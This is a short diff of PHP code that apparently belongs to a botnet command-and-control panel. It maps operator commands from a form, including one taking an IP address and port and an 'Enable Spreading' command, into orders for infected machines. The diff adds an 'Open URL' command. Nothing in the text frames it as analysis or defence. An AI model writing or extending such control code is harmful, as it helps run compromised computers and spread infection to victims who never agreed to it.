@@ -101,6 +101,11 @@ switch($Cmd){
 		CheckParam(true);
 		$ParamArray = array('IPAddress'=>$_POST['Param1'], 'Port'=>$_POST['Param2']);
 	} break;
+	case 'Open URL':{
+		$Cmd = 'OpenURL';
+		CheckParam();
+		$ParamArray = array('URL'=>$_POST['Param1']);
+	} break;
 	case 'Enable Spreading':{
 		$Cmd = 'Spread';
 	} break;
